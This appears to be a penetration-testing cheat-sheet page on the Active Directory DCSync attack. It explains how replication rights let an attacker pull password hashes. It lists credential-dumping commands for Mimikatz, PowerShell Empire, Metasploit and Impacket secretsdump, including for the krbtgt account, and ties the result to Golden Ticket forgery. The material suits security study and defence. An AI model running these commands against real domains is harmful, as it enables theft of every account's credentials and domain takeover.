# DCSync

The most of the Organisation need more than one domain controller for their Active Directory and to maintain consistency among multiple Domain controller, it is necessary to have the Active Directory objects replicated through those DCs with the help of MS-DRSR refer as Microsoft feature Directory Replication Service \(DRS\) Remote Protocol that is used to replicate users data from one DC to another. Taking Advantage of this feature the attack abuse the MS-DRSR using Mimikatz-DCSYNC.

{% hint style="info" %}
Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.
{% endhint %}

## **DCSYNC Attack**

The Mimikatz DCSYNC-function allows an attacker to replicate Domain Controller \(DC\) behaviour. Typically impersonates as a domain controller and request other DC’s for user credential data via GetNCChanges.

But compromised account should be a member of administrators, Domain Admin or Enterprise Admin to retrieve account password hashes from the others domain controller. As a result, the intruder will build Kerberos forged tickets using a retrieved hash to obtain any of the Active Directory ‘s resources and this is known as **Golden Ticket** attack.

{% hint style="info" %}
**For this attack to work, we need to have a user account with domain admins membership.**
{% endhint %}

### **Using Mimikatz DCSync**

```text
# DCSync only one user
mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt

# DCSync all users of the domain
mimikatz# lsadump::dcsync /domain:htb.local /all /csv
```

{% hint style="info" %}
Read-Only Domain Controllers are not allowed to pull password data for users by default.
{% endhint %}

### **PowerShell Empire**

```text
usemodule credentials/mimikatz/dcsync_hashdump
set user krbtgt
execute
```

the Empire has a similar module that retrieves the hash of the entire domain controller users account.

```text
usemodule credentials/mimikatz/dcsync_hashdump
execute
```

### **Metasploit**

If you have meterpreter session of the victim machine who account is member of domain admin, then here also you can execute Mimikatz-DCSYNC attack in order to obtain user’s password.

```text
load kiwi
dcsync_ntlm krbtgt
dcsync krbtgt
```

### Impacket secretsdump

```text
# using a plaintext password
secretsdump -outputfile 'something' 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'
​
# with Pass-the-Hash
secretsdump -outputfile 'something' -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
​
# with Pass-the-Ticket
secretsdump -k -outputfile 'something' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
```









